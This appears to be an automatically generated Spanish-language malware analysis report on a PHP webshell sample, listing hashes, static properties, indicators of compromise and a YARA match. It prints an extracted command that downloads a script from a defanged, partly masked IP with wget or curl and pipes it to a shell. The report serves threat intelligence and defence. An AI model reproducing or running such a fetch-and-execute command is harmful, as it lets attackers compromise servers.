# 🧬 Payload Analysis

`62d220e2da800ed8081aa9399451bc7769342fdaf9875fac70592b29bfbcf4e4`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. Una detección YARA válida respalda el análisis. **Ficha malware:** [malware-like/oraculo/webshell/62d220e2da800ed8081aa9399451bc7769342fdaf9875fac70592b29bfbcf4e4.md](../../../../../malware-like/oraculo/webshell/62d220e2da800ed8081aa9399451bc7769342fdaf9875fac70592b29bfbcf4e4.md)


## 🏷️ Clasificación

- **Categoría:** `Web shell`
- **Familia:** `webshell`
- **Confianza de familia:** `Alta`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T18:39:48.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `62d220e2da800ed8081aa9399451bc7769342fdaf9875fac70592b29bfbcf4e4`
- **MD5:** `993cf8ee944b2fd083c4f0cee123e0af`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (337), with CRLF line terminators |
| Tamaño | 2.3 KiB |
| Entropía | 5.85 |
| Strings | 41 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- YARA match: webshell

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh) | strings |
| url | hxxps://217.60.195.XXX/sh | strings |
| ip | 217.60.195.XXX | static_analysis |
| ip | 190.179.177.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | 62d220e2da800ed8081aa9399451bc7769342fdaf9875fac70592b29bfbcf4e4 | static_analysis |
| ip | 223.85.97.XXX | artifact_source |

## 🧬 Detecciones YARA

| Regla | Familia | Severidad | Confianza |
| --- | --- | --- | --- |
| Suspicious_PHP_Webshell |  | medium | medium |

Detalle completo: [`detections.md`](detections.md).

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
